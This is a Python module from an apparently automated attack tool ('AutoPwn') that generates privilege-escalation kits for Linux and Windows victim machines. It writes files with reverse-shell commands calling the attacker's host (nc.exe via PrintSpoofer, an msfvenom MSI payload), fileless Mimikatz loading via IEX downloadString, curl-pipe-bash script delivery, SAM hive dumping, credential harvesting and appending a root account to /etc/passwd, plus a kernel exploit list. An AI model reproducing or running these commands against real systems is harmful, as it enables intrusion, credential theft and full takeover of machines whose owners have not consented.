"""
privesc.py - Phase 4: Post-Exploitation & Privilege Escalation

Linux:
  - LinPEAS, linux-smart-enum, linenum
  - SUID/GUID, sudo -l, cron, writable files, PATH hijack
  - Kernel exploit suggestions (linux-exploit-suggester)
  - SSH key hunting, password reuse

Windows:
  - WinPEAS, PowerView, Seatbelt
  - SeImpersonate, AlwaysInstallElevated, Unquoted Service Path
  - JuicyPotato, PrintSpoofer, RoguePotato
  - Token impersonation, UAC bypass
  - Credential dumping (Mimikatz/LaZagne)

Generates commands to run inside the shell.
"""

import asyncio
import logging
import re
from pathlib import Path
from typing import List, Optional

from rich.console import Console
from rich.panel import Panel
from rich.table import Table

from modules.utils import run_command, save_output, has_tool

console = Console()


class PrivescModule:
    def __init__(self, target: str, target_dir: Path, cfg, log, all_results: dict):
        self.target = target
        self.target_dir = target_dir
        self.cfg = cfg
        self.log = log
        self.all_results = all_results
        self.dry_run = cfg.is_dry_run()
        self.os_type = all_results.get("recon", {}).get("os", "Unknown")
        self.lhost = cfg.get("lhost", "")
        self.lport = cfg.get("lport", 4444)

        self.results = {
            "os": self.os_type,
            "techniques_identified": [],
            "commands_generated": {},
            "credential_dump": [],
            "privesc_scripts": [],
            "root_achieved": False,
        }

        (target_dir / "privesc").mkdir(parents=True, exist_ok=True)

    async def run(self) -> dict:
        """Run privilege escalation enumeration and generate commands."""
        console.print(f"[magenta][*] Starting PrivEsc analysis ({self.os_type})[/magenta]")

        if self.os_type == "Windows":
            await self._privesc_windows()
        elif self.os_type == "Linux":
            await self._privesc_linux()
        else:
            # Run both
            await asyncio.gather(
                self._privesc_linux(),
                self._privesc_windows(),
            )

        self._generate_privesc_guide()
        self._print_summary()
        return self.results

    # ── Linux PrivEsc ─────────────────────────────────────────────────────────

    async def _privesc_linux(self):
        """Generate Linux PrivEsc commands and download scripts."""
        console.print("[magenta][*] Generating Linux PrivEsc toolkit...[/magenta]")

        await asyncio.gather(
            self._download_linpeas(),
            self._generate_manual_linux_checks(),
            self._generate_linux_exploit_suggester(),
        )

    async def _download_linpeas(self):
        """Download LinPEAS to serve to victim."""
        linpeas_dir = self.target_dir / "privesc" / "linux"
        linpeas_dir.mkdir(parents=True, exist_ok=True)
        linpeas_path = linpeas_dir / "linpeas.sh"

        if linpeas_path.exists():
            console.print("[green][+] LinPEAS already downloaded[/green]")
            self.results["privesc_scripts"].append(str(linpeas_path))
            return

        if self.dry_run:
            console.print("[dim][DRY-RUN] Would download LinPEAS[/dim]")
            return

        cmd = [
            "curl", "-L", "-o", str(linpeas_path),
            "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
            "--connect-timeout", "15", "-s",
        ]

        if has_tool("curl"):
            rc, _, _ = await run_command(cmd, timeout=60, log=self.log)
            if linpeas_path.exists() and linpeas_path.stat().st_size > 10000:
                console.print(f"[green][+] LinPEAS downloaded: {linpeas_path}[/green]")
                self.results["privesc_scripts"].append(str(linpeas_path))
            else:
                console.print("[yellow][!] LinPEAS download failed[/yellow]")

    async def _generate_manual_linux_checks(self):
        """Generate manual Linux PrivEsc enumeration commands."""
        out_file = self.target_dir / "privesc" / "linux_manual_checks.sh"

        checks = {
            "system_info": [
                "uname -a",
                "cat /etc/os-release",
                "cat /proc/version",
                "id",
                "whoami",
                "hostname",
            ],
            "sudo": [
                "sudo -l",
                "cat /etc/sudoers 2>/dev/null",
            ],
            "suid_sgid": [
                "find / -perm -4000 -type f 2>/dev/null",
                "find / -perm -2000 -type f 2>/dev/null",
                "find / -perm -4000 -o -perm -2000 2>/dev/null | xargs ls -la",
            ],
            "writable_files": [
                "find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys",
                "find / -writable -type d 2>/dev/null | grep -v proc",
                "ls -la /etc/passwd /etc/shadow /etc/crontab 2>/dev/null",
            ],
            "cron": [
                "cat /etc/crontab",
                "ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/",
                "crontab -l",
                'find / -name "*.sh" -writable 2>/dev/null',
            ],
            "services_processes": [
                "ps aux",
                "netstat -antup 2>/dev/null || ss -antup",
                "cat /etc/hosts",
                "systemctl list-units --type=service 2>/dev/null",
            ],
            "capabilities": [
                "getcap -r / 2>/dev/null",
            ],
            "nfs": [
                "cat /etc/exports",
                "showmount -e localhost",
            ],
            "credentials": [
                "find / -name '*.conf' 2>/dev/null | head -20",
                "find / -name 'id_rsa' -o -name '*.pem' 2>/dev/null",
                'grep -r "password" /etc/ 2>/dev/null | grep -v "#"',
                "cat ~/.bash_history",
                "find / -name 'wp-config.php' 2>/dev/null",
                "find / -name 'config.php' 2>/dev/null",
                "find / -name '.htpasswd' 2>/dev/null",
            ],
            "docker_lxd": [
                "id | grep -E 'docker|lxd'",
                "docker ps 2>/dev/null",
                "cat /etc/group | grep -E 'docker|lxd'",
            ],
            "path_abuse": [
                "echo $PATH",
                "env",
                "find / -perm -o+w -type f 2>/dev/null | head -20",
            ],
        }

        lines = ["#!/bin/bash", "# AutoPwn Linux PrivEsc Checklist", "# Run on VICTIM machine", ""]

        for section, cmds in checks.items():
            lines.append(f"echo '=== {section.upper()} ==='")
            for cmd in cmds:
                lines.append(cmd)
            lines.append("")

        # GTFOBins reference
        lines.extend([
            "echo '=== GTFOBINS QUICK CHECK ==='",
            "# Check SUID binaries against GTFOBins:",
            "# https://gtfobins.github.io/",
            "",
            "# Common exploitable SUIDs:",
            "# find, vim, nano, cp, mv, python, python3, perl, ruby, bash, sh",
            "# nmap, awk, sed, env, tee, less, more, man, apt, docker",
        ])

        save_output(out_file, "\n".join(lines))
        self.results["commands_generated"]["linux_checks"] = str(out_file)

        # Add delivery instructions
        self._add_delivery_note("linux_checks", out_file)

    async def _generate_linux_exploit_suggester(self):
        """Download linux-exploit-suggester."""
        les_dir = self.target_dir / "privesc" / "linux"
        les_dir.mkdir(parents=True, exist_ok=True)
        les_path = les_dir / "les.sh"

        if not les_path.exists() and not self.dry_run and has_tool("curl"):
            cmd = [
                "curl", "-L", "-o", str(les_path),
                "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh",
                "-s", "--connect-timeout", "15",
            ]
            await run_command(cmd, timeout=30, log=self.log)
            if les_path.exists():
                console.print(f"[green][+] linux-exploit-suggester downloaded: {les_path}[/green]")

        # Generate common kernel exploits reference
        kernel_ref = self.target_dir / "privesc" / "kernel_exploits.txt"
        kernel_data = """# Common Linux Kernel Exploits for PrivEsc
# Always verify kernel version: uname -a

# DirtyCow (CVE-2016-5195)  — Linux 2.6.22 < 3.9
# https://github.com/dirtycow/dirtycow.github.io
# git clone https://github.com/firefart/dirtycow; cd dirtycow; make dirty; ./dirty [password]

# DirtyPipe (CVE-2022-0847) — Linux 5.8 < 5.16.11
# https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits

# PwnKit (CVE-2021-4034)    — pkexec all versions until Jan 2022
# https://github.com/ly4k/PwnKit

# Baron Samedit (CVE-2021-3156) — sudo < 1.9.5p2
# https://github.com/blasty/CVE-2021-3156

# OverlayFS (CVE-2021-3493) — Ubuntu kernel < 5.11.0-1009-aws

# Netfilter (CVE-2022-25636) — Linux 5.4 < 5.6.10

# Run les.sh to auto-detect applicable exploits
"""
        save_output(kernel_ref, kernel_data)

    # ── Windows PrivEsc ───────────────────────────────────────────────────────

    async def _privesc_windows(self):
        """Generate Windows PrivEsc commands and scripts."""
        console.print("[magenta][*] Generating Windows PrivEsc toolkit...[/magenta]")

        await asyncio.gather(
            self._download_winpeas(),
            self._generate_manual_windows_checks(),
            self._generate_potato_scripts(),
        )

    async def _download_winpeas(self):
        """Download WinPEAS."""
        wpeas_dir = self.target_dir / "privesc" / "windows"
        wpeas_dir.mkdir(parents=True, exist_ok=True)
        wpeas_path = wpeas_dir / "winpeas.exe"

        if wpeas_path.exists():
            self.results["privesc_scripts"].append(str(wpeas_path))
            return

        if not self.dry_run and has_tool("curl"):
            cmd = [
                "curl", "-L", "-o", str(wpeas_path),
                "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe",
                "-s", "--connect-timeout", "15",
            ]
            rc, _, _ = await run_command(cmd, timeout=60, log=self.log)

            if wpeas_path.exists() and wpeas_path.stat().st_size > 100000:
                console.print(f"[green][+] WinPEAS downloaded: {wpeas_path}[/green]")
                self.results["privesc_scripts"].append(str(wpeas_path))
            else:
                console.print("[yellow][!] WinPEAS download failed[/yellow]")

    async def _generate_manual_windows_checks(self):
        """Generate manual Windows PrivEsc PowerShell/CMD commands."""
        out_file = self.target_dir / "privesc" / "windows_checks.txt"

        checks = {
            "System Info": [
                "systeminfo",
                "hostname",
                "whoami /all",
                "whoami /priv",
                "net user",
                "net localgroup administrators",
            ],
            "Services & Paths": [
                'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\"',
                "sc query",
                "net start",
                "tasklist /svc",
            ],
            "Registry & AlwaysInstallElevated": [
                "reg query HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                "reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                "reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
            ],
            "Stored Credentials": [
                "cmdkey /list",
                "vaultcmd /list",
                "dir C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\ 2>nul",
            ],
            "SAM/NTDS": [
                "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM",
                "reg save HKLM\\SAM C:\\Windows\\Temp\\SAM",
                "# Transfer and crack offline with: secretsdump.py -sam SAM -system SYSTEM LOCAL",
            ],
            "Token Privileges": [
                "# Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege",
                "whoami /priv | findstr /i \"impersonate\"",
            ],
            "Interesting Files": [
                "dir /s /b C:\\*.txt C:\\*.ini C:\\*.config 2>nul | findstr /i password",
                'dir C:\\Users\\*\\Desktop\\ /s',
                "dir C:\\Inetpub\\ /s",
                'findstr /si "password" C:\\Users\\*.txt C:\\Users\\*.xml C:\\Users\\*.ini 2>nul',
            ],
            "PowerShell History": [
                "type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
            ],
        }

        lines = ["# AutoPwn Windows PrivEsc Checklist", "# Run on VICTIM machine", ""]
        for section, cmds in checks.items():
            lines.append(f":: === {section.upper()} ===")
            for cmd in cmds:
                lines.append(cmd)
            lines.append("")

        save_output(out_file, "\n".join(lines))
        self.results["commands_generated"]["windows_checks"] = str(out_file)

    async def _generate_potato_scripts(self):
        """Generate JuicyPotato / PrintSpoofer delivery scripts."""
        potato_dir = self.target_dir / "privesc" / "windows"
        potato_dir.mkdir(parents=True, exist_ok=True)

        # PrintSpoofer instructions
        printspoofer = potato_dir / "printspoofer_guide.txt"
        content = f"""# PrintSpoofer - SeImpersonatePrivilege → SYSTEM
# Requirement: SeImpersonatePrivilege token

# Step 1: Download PrintSpoofer.exe to victim
# https://github.com/itm4n/PrintSpoofer/releases

# Step 2: Run (get cmd as SYSTEM):
PrintSpoofer.exe -i -c cmd

# Step 3: OR get reverse shell:
PrintSpoofer.exe -c "nc.exe {self.lhost} {self.lport} -e cmd"

---

# JuicyPotato (older Windows < Server 2019)
# https://github.com/ohpe/juicy-potato
# JuicyPotato.exe -l {self.lport} -p cmd.exe -t * -c {{CLSID}}

# Common CLSIDs:
# Windows 10: {{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}}
# Server 2016: {{e60687f7-01a1-40aa-86ac-db1cbf673334}}

---

# RoguePotato (newer Windows)
# https://github.com/antonioCoco/RoguePotato

---

# AlwaysInstallElevated:
# If both keys are 1, run:
msfvenom -p windows/x64/shell_reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f msi -o evil.msi
# Then: msiexec /quiet /qn /i evil.msi
"""
        save_output(printspoofer, content)

        # Mimikatz reference
        mimi = potato_dir / "mimikatz_guide.txt"
        mimi_content = f"""# Mimikatz Credential Dumping

# Interactive:
mimikatz.exe
privilege::debug
token::elevate
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
lsadump::cache

# One-liner:
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"

# Via PowerShell (in-memory):
IEX(New-Object Net.WebClient).downloadString('http://{self.lhost}/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'

# Via CrackMapExec:
crackmapexec smb {self.target} -u admin -p password --sam
crackmapexec smb {self.target} -u admin -p password -M mimikatz

# LaZagne (multi-platform):
python lazagne.py all
"""
        save_output(mimi, mimi_content)
        console.print(f"[green][+] Windows PrivEsc guides saved to {potato_dir}[/green]")

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _add_delivery_note(self, key: str, script_path: Path):
        """Add a note about how to deliver the script."""
        note = (
            f"Deliver {script_path.name} via:\n"
            f"  wget http://{self.lhost}:8000/{script_path.name} -O /tmp/{script_path.name}\n"
            f"  curl http://{self.lhost}:8000/{script_path.name} -o /tmp/{script_path.name}\n"
            f"Then: chmod +x /tmp/{script_path.name} && /tmp/{script_path.name} | tee /tmp/out.txt"
        )
        self.results["commands_generated"][f"{key}_delivery"] = note

    def _generate_privesc_guide(self):
        """Generate a comprehensive PrivEsc cheat sheet."""
        guide_file = self.target_dir / "privesc" / "GUIDE.md"
        lhost = self.lhost
        lport = self.lport
        target = self.target

        content = f"""# PrivEsc Guide for {target}
## OS: {self.os_type}

## Serving Files to Victim
```bash
# On attacker (serve current dir):
python3 -m http.server 8000
# Or with upload support:
updog -p 8000
```

## LinPEAS (Linux)
```bash
# On victim:
curl http://{lhost}:8000/linpeas.sh | bash | tee /tmp/linpeas.out
# Or:
wget http://{lhost}:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```

## WinPEAS (Windows)
```powershell
# Download and run:
certutil -urlcache -split -f http://{lhost}:8000/winpeas.exe C:\\Windows\\Temp\\wp.exe
C:\\Windows\\Temp\\wp.exe

# PowerShell:
IEX(New-Object Net.WebClient).downloadString('http://{lhost}:8000/PowerUp.ps1')
Invoke-AllChecks
```

## Common Linux PrivEsc
- `sudo -l` → check sudo without password
- SUID: `find / -perm -4000 2>/dev/null | xargs ls -la`
- Cron: `cat /etc/crontab; ls /etc/cron*`
- Writable /etc/passwd: `openssl passwd -1 hacked; echo 'r00t:$1$...:0:0:root:/root:/bin/bash' >> /etc/passwd`
- PATH: check if writable dir in PATH before system binary

## Common Windows PrivEsc
- `whoami /priv` → look for SeImpersonatePrivilege
- Unquoted service paths → create malicious EXE in path
- AlwaysInstallElevated → msiexec evil.msi
- Stored creds: `cmdkey /list`
- GPP passwords: `findstr /S /I cpassword \\\\{target}\\SYSVOL\\*.xml`

## Useful Tools
- https://gtfobins.github.io/  (Linux)
- https://lolbas-project.github.io/ (Windows)
- https://wadcoms.github.io/ (Active Directory)
"""
        save_output(guide_file, content)
        console.print(f"[green][+] PrivEsc guide: {guide_file}[/green]")

    def _print_summary(self):
        table = Table(title=f"PrivEsc Summary: {self.target}", header_style="bold magenta")
        table.add_column("Category", style="bold")
        table.add_column("Details")

        table.add_row("OS", self.results["os"])
        table.add_row("Scripts Downloaded", str(len(self.results["privesc_scripts"])))
        table.add_row("Command Sets", str(len(self.results["commands_generated"])))

        for script in self.results["privesc_scripts"]:
            table.add_row("Script", Path(script).name)

        console.print(table)
        console.print(f"\n[bold magenta]📁 All PrivEsc files in: {self.target_dir}/privesc/[/bold magenta]")
